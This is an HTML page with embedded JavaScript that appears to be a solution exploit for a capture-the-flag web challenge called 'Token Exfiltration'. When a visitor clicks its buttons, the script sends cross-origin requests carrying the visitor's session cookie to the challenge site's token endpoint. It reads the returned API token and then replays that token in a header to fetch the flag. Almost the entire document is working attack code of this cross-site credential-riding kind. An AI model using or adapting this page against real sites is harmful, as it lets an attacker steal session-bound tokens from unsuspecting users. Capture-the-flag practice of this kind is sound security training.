<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PointerOverflow CTF - Exfiltrate Token</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: system-ui, sans-serif; margin: 2rem; }
    h1 { color: #2a7ae2; }
    button { font-size: 1rem; padding: 0.5rem 1rem; margin: 0.5rem 0; }
    pre { background: #f4f4f4; padding: 1rem; overflow-x: auto; }
  </style>
</head>
<body>
  <h1>PointerOverflow CTF - Token Exfiltration</h1>

  <button id="fetchTokenBtn">Fetch Token</button>
  <button id="fetchFlagBtn" disabled>Fetch Flag</button>

  <p>Status: <span id="status">Idle</span></p>

  <pre id="output"></pre>

  <script>
    const statusEl = document.getElementById('status');
    const outputEl = document.getElementById('output');
    const fetchTokenBtn = document.getElementById('fetchTokenBtn');
    const fetchFlagBtn = document.getElementById('fetchFlagBtn');

    let apiToken = '';

    const log = (msg) => {
      console.log(msg);
      statusEl.textContent = msg;
    };

    fetchTokenBtn.onclick = async () => {
      log("Fetching token from target site...");
      try {
        const res = await fetch('https://web200-1.pointeroverflowctf.com/api/token', {
          credentials: 'include' // important to include the user's session cookie
        });

        if (!res.ok) throw new Error("Token request failed");

        const data = await res.json();
        apiToken = data.apiToken;
        log("Token fetched! You can now fetch the flag.");
        outputEl.textContent = `Token: ${apiToken}`;
        fetchFlagBtn.disabled = false;

      } catch (err) {
        log("Failed to fetch token.");
        outputEl.textContent = err;
      }
    };

    fetchFlagBtn.onclick = async () => {
      if (!apiToken) return;

      log("Fetching flag with X-Flag-Token...");
      try {
        const res = await fetch('https://web200-1.pointeroverflowctf.com/api/flag', {
          headers: {
            'X-Flag-Token': apiToken
          },
          credentials: 'include'
        });

        const text = await res.text();
        log("Flag fetched!");
        outputEl.textContent = `Flag response:\n${text}`;

      } catch (err) {
        log("Failed to fetch flag.");
        outputEl.textContent = err;
      }
    };
  </script>
</body>
</html>
